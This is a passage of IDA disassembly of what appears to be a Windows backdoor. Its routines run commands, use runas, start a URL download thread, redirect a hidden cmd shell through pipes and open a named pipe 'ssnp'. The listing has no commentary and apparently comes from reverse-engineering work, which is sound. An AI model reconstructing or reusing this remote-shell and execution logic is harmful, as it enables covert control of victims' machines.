                mov     [esp+10B8h+var_410], bl
                call    sub_413520
                add     esp, 0Ch
                call    ds:GetLastError
                push    eax
                lea     ecx, [esp+10B0h+var_410]
                push    offset aRunasFailedWit ; "\nRunas failed with error code : %d"
                push    ecx
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+10ACh+var_410]
                mov     [esp+10ACh+var_105C], 0Fh
                mov     [esp+10ACh+var_1060], ebx
                mov     byte ptr [esp+10ACh+var_1070], bl
                lea     edx, [eax+1]
                lea     esp, [esp+0]

loc_406260:                             ; CODE XREF: sub_405F00+365↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_406260
                sub     eax, edx
                push    eax
                lea     edx, [esp+10B0h+var_410]
                push    edx
                lea     ecx, [esp+10B4h+var_1074]
                call    sub_409840
                lea     eax, [esp+10ACh+var_1074]
                push    eax
                mov     [esp+10B0h+var_4], 1
                call    sub_408F30
                cmp     [esp+10ACh+var_105C], 10h
                jb      short loc_4062A4
                mov     ecx, [esp+10ACh+var_1070]
                push    ecx

loc_40629C:                             ; CODE XREF: sub_405F00+2F9↑j
                call    sub_40F15B
                add     esp, 4

loc_4062A4:                             ; CODE XREF: sub_405F00+2EE↑j
                                        ; sub_405F00+395↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                mov     eax, 1
                mov     ecx, [esp+10ACh+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebx
                mov     ecx, [esp+10A0h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 10A0h
                retn
sub_405F00      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4062E0      proc near               ; CODE XREF: sub_4052B0+2AD↑p

ProcessInformation= _PROCESS_INFORMATION ptr -8A0h
var_890         = byte ptr -890h
var_88C         = dword ptr -88Ch
var_87C         = dword ptr -87Ch
var_878         = dword ptr -878h
var_874         = byte ptr -874h
var_870         = dword ptr -870h
var_860         = dword ptr -860h
var_85C         = dword ptr -85Ch
StartupInfo     = _STARTUPINFOA ptr -858h
var_810         = byte ptr -810h
var_80F         = byte ptr -80Fh
CommandLine     = byte ptr -410h
var_40F         = byte ptr -40Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_4062E0
                mov     eax, large fs:0
                push    eax
                sub     esp, 894h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+8A0h+var_10], eax
                push    ebx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+8ACh+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    3FFh
                lea     eax, [esp+8B0h+var_40F]
                push    ebx
                push    eax
                mov     esi, ecx
                mov     [esp+8B8h+CommandLine], bl
                call    sub_413520
                lea     ecx, [esp+8B8h+CommandLine]
                add     esp, 0Ch
                push    ecx
                mov     edx, offset aJ  ; "J"
                mov     ecx, esi
                call    sub_404E40
                add     esp, 4
                push    44h
                lea     edx, [esp+8B0h+StartupInfo]
                push    ebx
                push    edx
                call    sub_413520
                add     esp, 0Ch
                xor     eax, eax
                mov     [esp+8ACh+ProcessInformation.hProcess], eax
                mov     [esp+8ACh+ProcessInformation.hThread], eax
                mov     [esp+8ACh+ProcessInformation.dwProcessId], eax
                mov     [esp+8ACh+ProcessInformation.dwThreadId], eax
                lea     eax, [esp+8ACh+ProcessInformation]
                push    eax             ; lpProcessInformation
                lea     ecx, [esp+8B0h+StartupInfo]
                push    ecx             ; lpStartupInfo
                push    ebx             ; lpCurrentDirectory
                push    ebx             ; lpEnvironment
                push    20h             ; dwCreationFlags
                push    1               ; bInheritHandles
                push    ebx             ; lpThreadAttributes
                push    ebx             ; lpProcessAttributes
                lea     edx, [esp+8CCh+CommandLine]
                push    edx             ; lpCommandLine
                push    ebx             ; lpApplicationName
                mov     [esp+8D4h+StartupInfo.cb], 44h
                call    ds:CreateProcessA
                test    eax, eax
                jz      short loc_406405
                mov     eax, [esp+8ACh+ProcessInformation.hThread]
                mov     esi, ds:CloseHandle
                push    eax             ; hObject
                call    esi ; CloseHandle
                mov     ecx, [esp+8ACh+ProcessInformation.hProcess]
                push    ecx             ; hObject
                call    esi ; CloseHandle
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    0Eh
                push    offset aExecSuccess ; "\nExec Success!"
                lea     ecx, [esp+8B4h+var_874]
                mov     [esp+8B4h+var_85C], 0Fh
                mov     [esp+8B4h+var_860], ebx
                mov     byte ptr [esp+8B4h+var_870], bl
                call    sub_409840
                lea     edx, [esp+8ACh+var_874]
                push    edx
                mov     [esp+8B0h+var_4], ebx
                call    sub_408F30
                cmp     [esp+8ACh+var_85C], 10h
                jb      loc_4064A7
                mov     eax, [esp+8ACh+var_870]
                push    eax
                jmp     loc_40649F
; ---------------------------------------------------------------------------

loc_406405:                             ; CODE XREF: sub_4062E0+BE↑j
                push    3FFh
                lea     ecx, [esp+8B0h+var_80F]
                push    ebx
                push    ecx
                mov     [esp+8B8h+var_810], bl
                call    sub_413520
                add     esp, 0Ch
                call    ds:GetLastError
                push    eax
                lea     edx, [esp+8B0h+var_810]
                push    offset aExecFailedWith ; "\nExec failed with error code : %d"
                push    edx
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+8ACh+var_810]
                mov     [esp+8ACh+var_878], 0Fh
                mov     [esp+8ACh+var_87C], ebx
                mov     byte ptr [esp+8ACh+var_88C], bl
                lea     edx, [eax+1]

loc_406463:                             ; CODE XREF: sub_4062E0+188↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_406463
                sub     eax, edx
                push    eax
                lea     eax, [esp+8B0h+var_810]
                push    eax
                lea     ecx, [esp+8B4h+var_890]
                call    sub_409840
                lea     ecx, [esp+8ACh+var_890]
                push    ecx
                mov     [esp+8B0h+var_4], 1
                call    sub_408F30
                cmp     [esp+8ACh+var_878], 10h
                jb      short loc_4064A7
                mov     edx, [esp+8ACh+var_88C]
                push    edx

loc_40649F:                             ; CODE XREF: sub_4062E0+120↑j
                call    sub_40F15B
                add     esp, 4

loc_4064A7:                             ; CODE XREF: sub_4062E0+115↑j
                                        ; sub_4062E0+1B8↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                mov     eax, 1
                mov     ecx, [esp+8ACh+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebx
                mov     ecx, [esp+8A0h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 8A0h
                retn
sub_4062E0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4064E0      proc near               ; CODE XREF: sub_4052B0+2D2↑p

var_42C         = byte ptr -42Ch
var_428         = dword ptr -428h
var_418         = dword ptr -418h
var_414         = dword ptr -414h
var_410         = byte ptr -410h
var_40F         = byte ptr -40Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_4064E0
                mov     eax, large fs:0
                push    eax
                sub     esp, 420h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+42Ch+var_10], eax
                push    ebx
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+434h+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    3FFh
                lea     eax, [esp+438h+var_40F]
                push    ebx
                push    eax
                mov     [esp+440h+var_410], bl
                call    sub_413520
                add     esp, 0Ch
                lea     ecx, [esp+434h+var_410]
                push    offset aServiceExecHav ; "service exec have not implemented\n"
                push    ecx
                call    sub_40E37C
                add     esp, 8
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+434h+var_410]
                mov     [esp+434h+var_414], 0Fh
                mov     [esp+434h+var_418], ebx
                mov     byte ptr [esp+434h+var_428], bl
                lea     edx, [eax+1]

loc_406565:                             ; CODE XREF: sub_4064E0+8A↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_406565
                sub     eax, edx
                push    eax
                lea     edx, [esp+438h+var_410]
                push    edx
                lea     ecx, [esp+43Ch+var_42C]
                call    sub_409840
                lea     eax, [esp+434h+var_42C]
                push    eax
                mov     [esp+438h+var_4], ebx
                call    sub_408F30
                cmp     [esp+434h+var_414], 10h
                jb      short loc_4065A2
                mov     ecx, [esp+434h+var_428]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_4065A2:                             ; CODE XREF: sub_4064E0+B3↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                mov     eax, 1
                mov     ecx, [esp+434h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     ebx
                mov     ecx, [esp+42Ch+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 42Ch
                retn
sub_4064E0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4065E0      proc near               ; CODE XREF: sub_4052B0+3EE↑p

var_26          = word ptr -26h
var_24          = qword ptr -24h
var_18          = byte ptr -18h
var_17          = dword ptr -17h
var_13          = dword ptr -13h
var_F           = dword ptr -0Fh
var_B           = word ptr -0Bh
var_9           = byte ptr -9
var_8           = dword ptr -8

                sub     esp, 2Ch
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+2Ch+var_8], eax
                xor     eax, eax
                mov     [esp+2Ch+var_18], al
                mov     [esp+2Ch+var_17], eax
                mov     [esp+2Ch+var_13], eax
                mov     [esp+2Ch+var_F], eax
                mov     [esp+2Ch+var_B], ax
                mov     [esp+2Ch+var_9], al
                lea     eax, [esp+2Ch+var_18]
                push    eax
                mov     edx, offset aJ  ; "J"
                call    sub_404E40
                lea     ecx, [esp+30h+var_18]
                push    ecx
                call    sub_40F78C
                fld     ds:dbl_422830
                fnstcw  [esp+34h+var_26]
                add     esp, 8
                movzx   eax, [esp+2Ch+var_26]
                fmul    st(1), st
                or      eax, 0C00h
                mov     dword ptr [esp+2Ch+var_24], eax
                mov     eax, hEvent
                fmulp   st(1), st
                push    eax             ; hEvent
                fldcw   word ptr [esp+30h+var_24]
                mov     dword_42AA10, 13h
                fistp   [esp+30h+var_24]
                mov     edx, dword ptr [esp+30h+var_24]
                mov     dword_42C34C, edx
                fldcw   [esp+30h+var_26]
                call    ds:SetEvent
                mov     ecx, [esp+2Ch+var_8]
                xor     ecx, esp
                mov     eax, 1
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 2Ch
                retn
sub_4065E0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_406690      proc near               ; CODE XREF: sub_4052B0+281↑p

var_28          = byte ptr -28h
var_24          = dword ptr -24h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_406690
                mov     eax, large fs:0
                push    eax
                sub     esp, 20h
                push    ebx
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+34h+var_C]
                mov     large fs:0, eax
                push    100h
                xor     ebx, ebx
                push    ebx
                push    offset szUrlName
                call    sub_413520
                add     esp, 0Ch
                push    100h
                push    ebx
                push    offset byte_42BE98
                call    sub_413520
                mov     eax, dword_42BF98
                add     esp, 0Ch
                cmp     eax, ebx
                jz      short loc_40670B
                push    0FA0h           ; dwMilliseconds
                push    eax             ; hHandle
                call    ds:WaitForSingleObject
                cmp     eax, 102h
                jnz     short loc_406705
                mov     eax, dword_42BF98
                push    ebx             ; dwExitCode
                push    eax             ; hThread
                call    ds:TerminateThread

loc_406705:                             ; CODE XREF: sub_406690+66↑j
                mov     dword_42BF98, ebx

loc_40670B:                             ; CODE XREF: sub_406690+53↑j
                push    offset szUrlName
                mov     edx, offset aJ  ; "J"
                mov     ecx, esi
                call    sub_404E40
                add     esp, 4
                push    offset byte_42BE98
                mov     edx, offset aM  ; "M"
                mov     ecx, esi
                call    sub_404E40
                add     esp, 4
                push    ebx             ; lpThreadId
                push    ebx             ; dwCreationFlags
                push    ebx             ; int
                push    offset sub_403800 ; int
                push    ebx             ; dwStackSize
                push    ebx             ; lpThreadAttributes
                call    sub_40EA6D
                add     esp, 18h
                mov     dword_42BF98, eax
                cmp     eax, ebx
                jnz     short loc_4067A6
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    1Fh
                push    offset aFailToStartDow ; "\nFail to start download thread!"
                lea     ecx, [esp+3Ch+var_28]
                mov     [esp+3Ch+var_10], 0Fh
                mov     [esp+3Ch+var_14], ebx
                mov     byte ptr [esp+3Ch+var_24], bl
                call    sub_409840
                lea     ecx, [esp+34h+var_28]
                push    ecx
                mov     [esp+38h+var_4], ebx
                call    sub_408F30
                cmp     [esp+34h+var_10], 10h
                jb      short loc_40679B
                mov     edx, [esp+34h+var_24]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_40679B:                             ; CODE XREF: sub_406690+FC↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection

loc_4067A6:                             ; CODE XREF: sub_406690+BC↑j
                mov     eax, 1
                mov     ecx, [esp+34h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     ebx
                add     esp, 2Ch
                retn
sub_406690      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4067C0      proc near               ; CODE XREF: sub_4052B0+2F7↑p

PipeAttributes  = _SECURITY_ATTRIBUTES ptr -690h
var_684         = byte ptr -684h
var_680         = dword ptr -680h
var_670         = dword ptr -670h
var_66C         = dword ptr -66Ch
StartupInfo     = _STARTUPINFOA ptr -668h
ProcessInformation= _PROCESS_INFORMATION ptr -620h
Buffer          = byte ptr -610h
var_60F         = byte ptr -60Fh
var_410         = byte ptr -410h
var_40F         = byte ptr -40Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_4067C0
                mov     eax, large fs:0
                push    eax
                sub     esp, 684h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+690h+var_10], eax
                push    ebx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+69Ch+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    1FFh
                lea     eax, [esp+6A0h+var_60F]
                push    ebx
                push    eax
                mov     [esp+6A8h+Buffer], bl
                call    sub_413520
                add     esp, 0Ch
                push    200h            ; uSize
                lea     ecx, [esp+6A0h+Buffer]
                push    ecx             ; lpBuffer
                call    ds:GetSystemDirectoryA
                lea     eax, [esp+69Ch+Buffer]
                dec     eax

loc_406833:                             ; CODE XREF: sub_4067C0+79↓j
                mov     cl, [eax+1]
                inc     eax
                cmp     cl, bl
                jnz     short loc_406833
                mov     edx, ds:dword_422604
                mov     ecx, ds:dword_422608
                mov     [eax], edx
                mov     dl, ds:byte_42260C
                mov     [eax+4], ecx
                mov     [eax+8], dl
                call    sub_407850
                mov     esi, ds:CreatePipe
                push    ebx             ; nSize
                lea     eax, [esp+6A0h+PipeAttributes]
                push    eax             ; lpPipeAttributes
                push    offset hWritePipe ; hWritePipe
                push    offset hReadPipe ; hReadPipe
                mov     [esp+6ACh+PipeAttributes.nLength], 0Ch
                mov     [esp+6ACh+PipeAttributes.lpSecurityDescriptor], ebx
                mov     [esp+6ACh+PipeAttributes.bInheritHandle], 1
                call    esi ; CreatePipe
                push    ebx             ; nSize
                lea     ecx, [esp+6A0h+PipeAttributes]
                push    ecx             ; lpPipeAttributes
                push    offset dword_42C32C ; hWritePipe
                push    offset hFile    ; hReadPipe
                call    esi ; CreatePipe
                lea     edx, [esp+69Ch+StartupInfo]
                push    edx             ; lpStartupInfo
                call    ds:GetStartupInfoA
                mov     edx, hReadPipe
                xor     eax, eax
                mov     [esp+69Ch+StartupInfo.wShowWindow], ax
                mov     eax, dword_42C32C
                xor     ecx, ecx
                mov     [esp+69Ch+StartupInfo.hStdOutput], eax
                mov     [esp+69Ch+StartupInfo.hStdError], eax
                lea     eax, [esp+69Ch+ProcessInformation]
                push    eax             ; lpProcessInformation
                mov     [esp+6A0h+StartupInfo.cbReserved2], cx
                lea     ecx, [esp+6A0h+StartupInfo]
                push    ecx             ; lpStartupInfo
                push    ebx             ; lpCurrentDirectory
                push    ebx             ; lpEnvironment
                push    ebx             ; dwCreationFlags
                push    1               ; bInheritHandles
                push    ebx             ; lpThreadAttributes
                mov     [esp+6B8h+StartupInfo.hStdInput], edx
                push    ebx             ; lpProcessAttributes
                lea     edx, [esp+6BCh+Buffer]
                push    edx             ; lpCommandLine
                push    ebx             ; lpApplicationName
                mov     [esp+6C4h+StartupInfo.cb], 44h
                mov     [esp+6C4h+StartupInfo.lpReserved], ebx
                mov     [esp+6C4h+StartupInfo.lpTitle], ebx
                mov     [esp+6C4h+StartupInfo.lpDesktop], ebx
                mov     [esp+6C4h+StartupInfo.dwYSize], ebx
                mov     [esp+6C4h+StartupInfo.dwXSize], ebx
                mov     [esp+6C4h+StartupInfo.dwY], ebx
                mov     [esp+6C4h+StartupInfo.dwX], ebx
                mov     [esp+6C4h+StartupInfo.lpReserved2], ebx
                mov     [esp+6C4h+StartupInfo.dwFlags], 101h
                call    ds:CreateProcessA
                test    eax, eax
                jz      short loc_406960
                mov     ecx, [esp+69Ch+ProcessInformation.hThread]
                mov     eax, [esp+69Ch+ProcessInformation.hProcess]
                push    ecx             ; hObject
                mov     hProcess, eax
                call    ds:CloseHandle
                push    64h             ; dwMilliseconds
                call    ds:Sleep
                push    ebx             ; lpThreadId
                push    ebx             ; dwCreationFlags
                push    ebx             ; int
                push    offset sub_403630 ; int
                push    ebx             ; dwStackSize
                push    ebx             ; lpThreadAttributes
                call    sub_40EA6D
                add     esp, 18h
                mov     dword_42C360, eax
                jmp     loc_406A0B
; ---------------------------------------------------------------------------

loc_406960:                             ; CODE XREF: sub_4067C0+163↑j
                push    3FFh
                lea     edx, [esp+6A0h+var_40F]
                push    ebx
                push    edx
                mov     [esp+6A8h+var_410], bl
                call    sub_413520
                add     esp, 0Ch
                call    ds:GetLastError
                push    eax
                lea     eax, [esp+6A0h+var_410]
                push    offset aCreateCmdShell ; "\nCreate cmd shell failed with err code"...
                push    eax
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+69Ch+var_410]
                mov     [esp+69Ch+var_66C], 0Fh
                mov     [esp+69Ch+var_670], ebx
                mov     byte ptr [esp+69Ch+var_680], bl
                lea     edx, [eax+1]
                mov     edi, edi

loc_4069C0:                             ; CODE XREF: sub_4067C0+205↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_4069C0
                sub     eax, edx
                push    eax
                lea     ecx, [esp+6A0h+var_410]
                push    ecx
                lea     ecx, [esp+6A4h+var_684]
                call    sub_409840
                lea     edx, [esp+69Ch+var_684]
                push    edx
                mov     [esp+6A0h+var_4], ebx
                call    sub_408F30
                cmp     [esp+69Ch+var_66C], 10h
                jb      short loc_406A00
                mov     eax, [esp+69Ch+var_680]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_406A00:                             ; CODE XREF: sub_4067C0+231↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection

loc_406A0B:                             ; CODE XREF: sub_4067C0+19B↑j
                mov     eax, 1
                mov     ecx, [esp+69Ch+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebx
                mov     ecx, [esp+690h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 690h
                retn
sub_4067C0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_406A40      proc near               ; CODE XREF: sub_4052B0+348↑p

var_250         = byte ptr -250h
var_24C         = dword ptr -24Ch
var_23C         = dword ptr -23Ch
var_238         = dword ptr -238h
var_234         = byte ptr -234h
var_230         = dword ptr -230h
var_220         = dword ptr -220h
var_21C         = dword ptr -21Ch
var_218         = byte ptr -218h
var_217         = byte ptr -217h
Buffer          = byte ptr -118h
var_117         = byte ptr -117h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_406A40
                mov     eax, large fs:0
                push    eax
                sub     esp, 248h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+254h+var_10], eax
                push    ebx
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+25Ch+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    103h
                lea     eax, [esp+260h+var_117]
                push    ebx
                push    eax
                mov     [esp+268h+Buffer], bl
                call    sub_413520
                add     esp, 0Ch
                lea     ecx, [esp+25Ch+Buffer]
                push    ecx             ; lpBuffer
                push    104h            ; nBufferLength
                call    ds:GetCurrentDirectoryA
                test    eax, eax
                jnz     loc_406B42
                push    0FFh
                lea     edx, [esp+260h+var_217]
                push    ebx
                push    edx
                mov     [esp+268h+var_218], bl
                call    sub_413520
                add     esp, 0Ch
                call    ds:GetLastError
                push    eax
                lea     eax, [esp+260h+var_218]
                push    offset aCanNotGetCurre ; "Can not get current directory with erro"...
                push    eax
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+25Ch+var_218]
                mov     [esp+25Ch+var_238], 0Fh
                mov     [esp+25Ch+var_23C], ebx
                mov     byte ptr [esp+25Ch+var_24C], bl
                lea     edx, [eax+1]

loc_406B04:                             ; CODE XREF: sub_406A40+C9↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_406B04
                sub     eax, edx
                push    eax
                lea     ecx, [esp+260h+var_218]
                push    ecx
                lea     ecx, [esp+264h+var_250]
                call    sub_409840
                lea     edx, [esp+25Ch+var_250]
                push    edx
                mov     [esp+260h+var_4], ebx
                call    sub_408F30
                cmp     [esp+25Ch+var_238], 10h
                jb      loc_406C58
                mov     eax, [esp+25Ch+var_24C]
                push    eax
                jmp     loc_406C50
; ---------------------------------------------------------------------------

loc_406B42:                             ; CODE XREF: sub_406A40+6C↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    1
                push    offset asc_422670 ; "\n"
                lea     ecx, [esp+264h+var_250]
                mov     [esp+264h+var_238], 0Fh
                mov     [esp+264h+var_23C], ebx
                mov     byte ptr [esp+264h+var_24C], bl
                call    sub_409840
                lea     ecx, [esp+25Ch+var_250]
                push    ecx
                mov     [esp+260h+var_4], 1
                call    sub_408F30
                mov     [esp+25Ch+var_4], 0FFFFFFFFh
                cmp     [esp+25Ch+var_238], 10h
                jb      short loc_406BA1
                mov     edx, [esp+25Ch+var_24C]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_406BA1:                             ; CODE XREF: sub_406A40+152↑j
                lea     eax, [esp+25Ch+Buffer]
                mov     [esp+25Ch+var_238], 0Fh
                mov     [esp+25Ch+var_23C], ebx
                mov     byte ptr [esp+25Ch+var_24C], bl
                lea     edx, [eax+1]
                jmp     short loc_406BC0
; ---------------------------------------------------------------------------
                align 10h

loc_406BC0:                             ; CODE XREF: sub_406A40+17B↑j
                                        ; sub_406A40+185↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_406BC0
                sub     eax, edx
                push    eax
                lea     eax, [esp+260h+Buffer]
                push    eax
                lea     ecx, [esp+264h+var_250]
                call    sub_409840
                lea     ecx, [esp+25Ch+var_250]
                push    ecx
                mov     [esp+260h+var_4], 2
                call    sub_408F30
                mov     [esp+25Ch+var_4], 0FFFFFFFFh
                cmp     [esp+25Ch+var_238], 10h
                jb      short loc_406C0F
                mov     edx, [esp+25Ch+var_24C]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_406C0F:                             ; CODE XREF: sub_406A40+1C0↑j
                push    1
                push    offset asc_422674 ; ">"
                lea     ecx, [esp+264h+var_234]
                mov     [esp+264h+var_21C], 0Fh
                mov     [esp+264h+var_220], ebx
                mov     byte ptr [esp+264h+var_230], bl
                call    sub_409840
                lea     eax, [esp+25Ch+var_234]
                push    eax
                mov     [esp+260h+var_4], 3
                call    sub_408F30
                cmp     [esp+25Ch+var_21C], 10h
                jb      short loc_406C58
                mov     ecx, [esp+25Ch+var_230]
                push    ecx

loc_406C50:                             ; CODE XREF: sub_406A40+FD↑j
                call    sub_40F15B
                add     esp, 4

loc_406C58:                             ; CODE XREF: sub_406A40+F2↑j
                                        ; sub_406A40+209↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                mov     eax, 1
                mov     ecx, [esp+25Ch+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     ebx
                mov     ecx, [esp+254h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 254h
                retn
sub_406A40      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_406C90      proc near               ; CODE XREF: sub_4052B0+399↑p

NumberOfBytesWritten= dword ptr -2868h
var_2864        = byte ptr -2864h
var_2860        = dword ptr -2860h
var_2850        = dword ptr -2850h
var_284C        = dword ptr -284Ch
Overlapped      = _OVERLAPPED ptr -2848h
var_2834        = byte ptr -2834h
var_2830        = dword ptr -2830h
var_281C        = dword ptr -281Ch
Buffer          = dword ptr -2818h
var_810         = byte ptr -810h
var_80F         = byte ptr -80Fh
var_410         = byte ptr -410h
var_40F         = byte ptr -40Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_406C90
                mov     eax, large fs:0
                push    eax
                mov     eax, 285Ch
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+2868h+var_10], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+287Ch+var_C]
                mov     large fs:0, eax
                mov     eax, hObject
                mov     ebp, ds:CloseHandle
                xor     ebx, ebx
                cmp     eax, ebx
                jz      short loc_406CF5
                push    eax             ; hNamedPipe
                call    ds:DisconnectNamedPipe
                mov     eax, hObject
                push    eax             ; hObject
                call    ebp ; CloseHandle
                mov     hObject, ebx

loc_406CF5:                             ; CODE XREF: sub_406C90+4E↑j
                mov     eax, dword_42BD94
                cmp     eax, ebx
                jz      short loc_406D07
                push    eax             ; hObject
                call    ebp ; CloseHandle
                mov     dword_42BD94, ebx

loc_406D07:                             ; CODE XREF: sub_406C90+6C↑j
                push    ebx             ; lpSecurityAttributes
                push    ebx             ; nDefaultTimeOut
                push    800h            ; nInBufferSize
                push    800h            ; nOutBufferSize
                push    0FFh            ; nMaxInstances
                push    6               ; dwPipeMode
                push    0C0000003h      ; dwOpenMode
                push    offset Name     ; "\\\\.\\pipe\\ssnp"
                call    ds:CreateNamedPipeA
                mov     hObject, eax
                cmp     eax, 0FFFFFFFFh
                jnz     loc_406DE6
                push    3FFh
                lea     ecx, [esp+2880h+var_80F]
                push    ebx
                push    ecx
                mov     [esp+2888h+var_810], bl
                call    sub_413520
                add     esp, 0Ch
                call    ds:GetLastError
                push    eax
                lea     edx, [esp+2880h+var_810]
                push    offset aCreateNamedPip ; "\nCreate named pipe failed with error c"...
                push    edx
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+287Ch+var_810]
                mov     [esp+287Ch+var_284C], 0Fh
                mov     [esp+287Ch+var_2850], ebx
                mov     byte ptr [esp+287Ch+var_2860], bl
                lea     edx, [eax+1]

loc_406D96:                             ; CODE XREF: sub_406C90+10B↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_406D96
                sub     eax, edx
                push    eax
                lea     eax, [esp+2880h+var_810]
                push    eax
                lea     ecx, [esp+2884h+var_2864]
                call    sub_409840
                lea     ecx, [esp+287Ch+var_2864]
                push    ecx
                mov     [esp+2880h+var_4], ebx
                call    sub_408F30
                cmp     [esp+287Ch+var_284C], 10h
                jb      short loc_406DD6
                mov     edx, [esp+287Ch+var_2860]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_406DD6:                             ; CODE XREF: sub_406C90+137↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                jmp     loc_407013
; ---------------------------------------------------------------------------

loc_406DE6:                             ; CODE XREF: sub_406C90+A2↑j
                push    ebx             ; lpName
                push    ebx             ; bInitialState
                push    1               ; bManualReset
                push    ebx             ; lpEventAttributes
                call    ds:CreateEventA
                mov     ecx, hObject
                mov     [esp+287Ch+Overlapped.hEvent], eax
                lea     eax, [esp+287Ch+Overlapped]
                push    eax             ; lpOverlapped
                push    ecx             ; hNamedPipe
                call    ds:ConnectNamedPipe
                test    eax, eax
                jnz     loc_40700C
                mov     edi, ds:GetLastError
                call    edi ; GetLastError
                mov     esi, eax
                cmp     esi, 3E5h
                jnz     loc_406F83
                mov     edx, [esp+287Ch+Overlapped.hEvent]
                push    2710h           ; dwMilliseconds
                push    edx             ; hHandle
